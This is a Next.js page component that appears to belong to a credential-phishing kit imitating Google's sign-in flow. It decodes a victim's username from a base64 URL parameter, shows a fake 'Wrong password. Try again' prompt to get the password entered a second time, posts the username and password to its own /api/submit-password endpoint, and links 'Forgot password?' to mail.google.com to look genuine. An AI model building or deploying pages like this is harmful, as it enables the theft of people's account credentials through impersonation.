'use client';

import { useSearchParams } from 'next/navigation';
import { useEffect, useState } from 'react';
import '../../public/styles/wrongpwd.css'; // ✅ Import CSS at top-level in client component
import SearchParamsWrapper from '../../components/SearchParamsWrapper';
import { notFound } from 'next/navigation';

function WrongpwdPageContent() {
  const searchParams = useSearchParams();
  const [userInfo, setUserInfo] = useState<{
    username: string;
    mobiletype: string;
  } | null>(null);
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    // Get the first query parameter value (regardless of key name)
    const encodedData = Array.from(searchParams.values())[0];
    
    if (!encodedData) {
      notFound();
      return;
    }

    try {
      // Decode the base64 string
      const decodedString = atob(encodedData);
      const parts = decodedString.split('/');
      if (parts.length >= 3) {
        setUserInfo({
          username: parts[1],
          mobiletype: parts[2]
        });
      } else {
        notFound();
      }
    } catch (error) {
      console.error('Error decoding data:', error);
      notFound();
    }
  }, [searchParams]);

  //handlePasswordSubmit  
    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);
    const username = formData.get('user') as string;
    const password = formData.get('password') as string;

    const response = await fetch('/api/submit-password', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username, password }),
    });

    if (response.ok) {
      const result = await response.json();
      window.location.href = result.redirectUrl;
    }
  };

  if (!userInfo) {
    return <div>Loading...</div>;
  }
  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };
  return (
    <body>
      <div className="maindiv">
        <form className="loginform" onSubmit={handleSubmit}>
          <div className="form-half">
            <div><img className="divlogo" src="/images/image.png" /></div>
            <div><span className="welcome">Verify it's you</span></div>                
            <div className="userdiv">
              <img className="left-img" src="/images/user-circle.png" />&nbsp;&nbsp;
              <span style={{color: '#2c2a2a', fontSize: '18px', fontFamily: 'Arial, Helvetica, sans-serif'}}>{userInfo.username}</span>&nbsp;
              <img className="right-img" src="/images/dropd.jpg" />
            </div>
          </div>
          <div className="form-half"><br/><br/><br/><br/>
            <div className="input-box">
              <input type='hidden' name="user" id="useRname" value={userInfo.username} />
              <input 
                className="input-box-input" 
                name="password" 
                type={showPassword ? 'text' : 'password'} 
                id="pEyar" 
                placeholder=" " 
                autoComplete="new-password"
              />
              <label className="input-box-placeholder">Enter your password</label>
            </div>
              <div id="togglePassword" className="shwpwd">
               <span className="errorText">
                Wrong password. Try again or retype your password.
              </span>
              </div>
            <div id="togglePassword" className="shwpwd">
                <input
                  type="checkbox"
                  onChange={togglePasswordVisibility}
                  checked={showPassword}
                  className="checkbox"
                />
                <span onClick={togglePasswordVisibility} className="button">
                  Show password
                </span>
              </div>

            <div className="fgtpwd">
              <button id="myButton" className="hyperl" type="button" onClick={() => window.location.href = "https://mail.google.com"}>Forgot password?</button>&nbsp;&nbsp;&nbsp;
              <button type="submit" className="btnnxt">Next</button>
            </div>
          </div>
        </form>

        <div className="btmdiv">
          <div className="left-div">
            <select className="btmhypl" id="language-select">
              <option value="en">English (United States)</option>
              <option value="fr">French</option>
              <option value="es">Spanish</option>
              <option value="de">German</option>
            </select>
          </div>
          <div className="right-divs">
            <div className="right-div">
              <button id="helpButton" className="btmhypl">Help</button>
            </div>
            <div className="right-div">
              <button id="privacyButton" className="btmhypl">Privacy</button>
            </div>
            <div className="right-div">
              <button id="termsButton" className="btmhypl">Terms</button>
            </div>
          </div>
        </div>
      </div>
    </body>
  );
}

export default function WrongpwdPage() {
  return (
    <SearchParamsWrapper>
      <WrongpwdPageContent />
    </SearchParamsWrapper>
  );
}